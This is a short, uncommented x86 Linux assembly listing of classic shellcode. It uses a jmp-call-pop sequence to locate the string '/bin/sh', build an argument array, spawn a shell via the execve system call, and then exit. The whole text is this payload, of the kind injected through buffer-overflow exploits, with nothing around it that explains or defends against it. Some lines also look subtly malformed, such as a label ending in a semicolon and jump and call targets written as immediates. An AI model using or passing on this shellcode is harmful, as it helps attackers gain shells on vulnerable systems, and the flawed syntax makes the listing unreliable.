.text
.global start
start;
jmp 	$code
main:
pop 	%esi
mov	%esi,0x8(%esi)
xor	%eax,%eax
mov	%al,0x7(%esi)
mov 	%eax,0xc(%esi)
mov	$0xb,%al
mov	%esi,%ebx
lea   0x8(%esi),%ecx
lea   0xc(%esi),%edx
int   $0x80
xor	%ebx,%ebx
mov	%ebx,%eax
inc   %eax
int   $0x80
code:
call 	$main
.string	   "/bin/sh#AAAABBBB"	
ret